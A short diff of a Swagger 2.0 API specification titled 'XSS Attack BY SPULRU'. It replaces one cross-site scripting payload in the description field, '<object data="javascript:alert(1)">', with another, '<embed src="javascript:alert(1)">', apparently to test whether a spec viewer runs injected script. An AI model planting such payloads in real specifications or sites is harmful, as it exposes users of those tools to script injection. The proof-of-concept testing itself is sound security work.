@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: XSS Attack BY SPULRU
-  description: <object data="javascript:alert(1)">
+  description: <embed src="javascript:alert(1)">
     
   version: production
 basePath: /JSSResource/
